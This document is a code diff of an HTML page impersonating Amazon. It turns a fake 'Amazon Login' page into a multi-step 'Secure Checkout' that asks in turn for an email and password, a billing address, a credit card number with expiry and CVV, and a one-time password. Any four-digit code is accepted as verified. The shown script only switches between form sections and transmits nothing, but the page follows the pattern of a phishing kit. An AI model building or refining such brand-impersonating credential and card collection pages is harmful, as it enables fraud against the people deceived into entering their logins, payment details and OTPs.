@@ -4,41 +4,49 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <title>Amazon Login</title>
+    <title>Amazon Checkout</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
     <style>
-        /* Basic styling for login page */
+        /* Basic styling for the entire flow */
         body {
             font-family: 'Roboto', sans-serif;
+            background-color: #f3f3f3;
             margin: 0;
             padding: 0;
-            background-color: #f3f3f3;
         }
 
         .container {
             width: 100%;
-            max-width: 400px;
+            max-width: 800px;
             margin: 50px auto;
             background-color: #fff;
-            padding: 20px;
+            padding: 30px;
             border-radius: 8px;
             box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
         }
 
-        .logo {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-
-        .logo img {
-            max-width: 150px;
+        .header {
+            background-color: #131921;
+            padding: 15px 20px;
+            color: white;
+            font-size: 20px;
+            font-weight: 500;
+            border-radius: 5px;
+            margin-bottom: 30px;
         }
 
         h1 {
             font-size: 24px;
             color: #131921;
-            text-align: left;
             font-weight: 500;
+            margin-bottom: 20px;
+        }
+
+        .section-title {
+            font-size: 20px;
+            font-weight: 500;
+            color: #131921;
+            margin-bottom: 15px;
         }
 
         .input-field {
@@ -72,59 +80,184 @@
             background-color: #e68900;
         }
 
-        .forgot-password,
-        .create-account {
-            text-align: center;
-            margin-top: 10px;
+        .payment-methods {
+            display: flex;
+            gap: 15px;
+            margin: 10px 0;
         }
 
-        .forgot-password a,
-        .create-account a {
+        .payment-methods img {
+            max-width: 60px;
+            cursor: pointer;
+        }
+
+        .resend-otp {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 14px;
+        }
+
+        .resend-otp a {
             color: #0066c0;
             text-decoration: none;
         }
 
-        .forgot-password a:hover,
-        .create-account a:hover {
+        .resend-otp a:hover {
             text-decoration: underline;
         }
 
+        .back-to-cart {
+            display: block;
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        .back-to-cart a {
+            color: #0066c0;
+            text-decoration: none;
+        }
+
+        .back-to-cart a:hover {
+            text-decoration: underline;
+        }
+
+        /* Hiding sections except for the active one */
+        .section {
+            display: none;
+        }
+
+        .active {
+            display: block;
+        }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <!-- Amazon Logo -->
-    <div class="logo">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo">
+    <!-- Header Section -->
+    <div class="header">
+        <span>Secure Checkout</span>
     </div>
 
-    <!-- Sign In Heading -->
-    <h1>Sign-In</h1>
-
-    <!-- Login Form -->
-    <form action="billing.html" method="GET">
-        <!-- Email or Phone -->
-        <input type="email" id="email" name="email" class="input-field" placeholder="Email or mobile phone number" required>
-
-        <!-- Password -->
-        <input type="password" id="password" name="password" class="input-field" placeholder="Password" required>
-
-        <!-- Sign-In Button -->
-        <button type="submit" class="submit-btn">Sign-In</button>
-    </form>
-
-    <!-- Forgot Password Link -->
-    <div class="forgot-password">
-        <a href="#">Forgot your password?</a>
+    <!-- Login Page Section -->
+    <div class="section active" id="login-section">
+        <h1>Sign-In</h1>
+        <form onsubmit="showBillingPage(event)">
+            <input type="email" id="email" name="email" class="input-field" placeholder="Email or mobile phone number" required>
+            <input type="password" id="password" name="password" class="input-field" placeholder="Password" required>
+            <button type="submit" class="submit-btn">Sign-In</button>
+        </form>
+        <div class="forgot-password">
+            <a href="#">Forgot your password?</a>
+        </div>
+        <div class="create-account">
+            <p>New to Amazon? <a href="#">Create your Amazon account</a></p>
+        </div>
     </div>
 
-    <!-- Create Amazon Account -->
-    <div class="create-account">
-        <p>New to Amazon?</p>
-        <a href="#">Create your Amazon account</a>
+    <!-- Billing Page Section -->
+    <div class="section" id="billing-section">
+        <h1>Billing Information</h1>
+        <div class="section-title">Enter your billing details</div>
+        <form onsubmit="showPaymentPage(event)">
+            <input type="text" id="fullName" name="fullName" class="input-field" placeholder="Full Name" required>
+            <input type="text" id="address1" name="address1" class="input-field" placeholder="Address Line 1" required>
+            <input type="text" id="address2" name="address2" class="input-field" placeholder="Address Line 2 (optional)">
+            <input type="text" id="city" name="city" class="input-field" placeholder="City" required>
+            <input type="text" id="state" name="state" class="input-field" placeholder="State/Province" required>
+            <input type="text" id="postalCode" name="postalCode" class="input-field" placeholder="Postal Code" required>
+            <input type="tel" id="phone" name="phone" class="input-field" placeholder="Phone Number" required>
+            <button type="submit" class="submit-btn">Continue to Payment</button>
+        </form>
     </div>
+
+    <!-- Payment Page Section -->
+    <div class="section" id="payment-section">
+        <h1>Payment Information</h1>
+        <div class="section-title">Enter your payment details</div>
+        <form onsubmit="showOtpPage(event)">
+            <input type="text" id="cardNumber" name="cardNumber" class="input-field" placeholder="Credit Card Number" required>
+            <div style="display: flex; gap: 10px;">
+                <input type="text" id="expMonth" name="expMonth" class="input-field" placeholder="MM" style="width: 45%;" required>
+                <input type="text" id="expYear" name="expYear" class="input-field" placeholder="YY" style="width: 45%;" required>
+            </div>
+            <input type="text" id="cvv" name="cvv" class="input-field" placeholder="CVV" required>
+            <div class="payment-methods">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/PayPal_logo_2014.svg" alt="PayPal" title="Pay with PayPal">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/4/47/Visa_2014_logo.svg" alt="Visa" title="Pay with Visa">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/6/6c/MasterCard_Logo_2019.svg" alt="MasterCard" title="Pay with MasterCard">
+            </div>
+            <button type="submit" class="submit-btn">Submit Payment</button>
+        </form>
+    </div>
+
+    <!-- OTP Verification Page Section -->
+    <div class="section" id="otp-section">
+        <h1>Enter the OTP sent to your phone number</h1>
+        <div class="section-title">We have sent a one-time password (OTP) to your mobile number. Please enter the OTP below to continue.</div>
+        <form onsubmit="verifyOTP(event)">
+            <div style="display: flex; gap: 10px;">
+                <input type="text" id="otp1" name="otp1" class="input-field" maxlength="1" required>
+                <input type="text" id="otp2" name="otp2" class="input-field" maxlength="1" required>
+                <input type="text" id="otp3" name="otp3" class="input-field" maxlength="1" required>
+                <input type="text" id="otp4" name="otp4" class="input-field" maxlength="1" required>
+            </div>
+            <button type="submit" class="submit-btn">Verify OTP</button>
+        </form>
+        <div class="resend-otp">
+            <p>Didn't receive the OTP? <a href="#" onclick="resendOTP()">Resend OTP</a></p>
+        </div>
+    </div>
+
 </div>
+
+<script>
+    // Function to show Billing Page after login
+    function showBillingPage(event) {
+        event.preventDefault();
+        document.getElementById("login-section").classList.remove("active");
+        document.getElementById("billing-section").classList.add("active");
+    }
+
+    // Function to show Payment Page after billing information
+    function showPaymentPage(event) {
+        event.preventDefault();
+        document.getElementById("billing-section").classList.remove("active");
+        document.getElementById("payment-section").classList.add("active");
+    }
+
+    // Function to show OTP Page after payment information
+    function showOtpPage(event) {
+        event.preventDefault();
+        document.getElementById("payment-section").classList.remove("active");
+        document.getElementById("otp-section").classList.add("active");
+    }
+
+    // Function to verify OTP
+    function verifyOTP(event) {
+        event.preventDefault();
+        const otp = [
+            document.getElementById('otp1').value,
+            document.getElementById('otp2').value,
+            document.getElementById('otp3').value,
+            document.getElementById('otp4').value
+        ];
+
+        const otpString = otp.join('');
+        if (otpString.length === 4 && !otp.includes("")) {
+            alert('OTP verified successfully!');
+            // Proceed to confirmation or next step (e.g., order completion)
+        } else {
+            alert('Please enter a valid OTP.');
+        }
+    }
+
+    // Function to simulate resending the OTP
+    function resendOTP() {
+        alert('A new OTP has been sent to your phone number.');
+    }
+</script>
 
 </body>
 </html>
